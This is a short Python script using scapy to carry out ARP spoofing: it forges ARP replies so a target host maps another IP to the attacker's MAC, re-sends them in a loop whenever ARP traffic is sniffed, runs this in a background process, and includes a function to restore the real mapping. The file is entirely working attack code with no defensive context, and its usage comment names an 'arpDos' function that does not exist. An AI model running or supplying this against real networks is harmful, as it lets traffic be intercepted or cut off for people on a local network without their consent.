from scapy.all import *
import subprocess
import os
import multiprocessing
#masq_ip: ip we masquerade as.
#masc_mac: Masqueraded mac address
#source_mac: Our mac address
#Dest IP: target ip
#Dest Mac: target mac address
#ex: arpDos("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")

def arpSend(masq_ip, masq_mac, source_mac, dest_ip, dest_mac):
    packet = ARP()
    packet.op = 2
    packet.psrc = masq_ip
    packet.pdst = dest_ip
    packet.hwdst = dest_mac
    packet.hwsrc = source_mac
    send(packet)
    while True:
        send(packet)
        sniff(filter="arp and host " + masq_ip, count=1)

def arpBegin(masq_ip, masq_mac, source_mac, dest_ip, dest_mac):
    proc= multiprocessing.Process(target=arpSend, args=(masq_ip, masq_mac, source_mac, dest_ip, dest_mac))
    proc.start()
    return proc

def arpEnd(masq_ip, masq_mac, dest_ip, dest_mac):
    packet = ARP()
    packet.op = 2
    packet.psrc = masq_ip
    packet.pdst = dest_ip
    packet.hwdst = dest_mac
    packet.hwsrc = masq_mac
    send(packet)

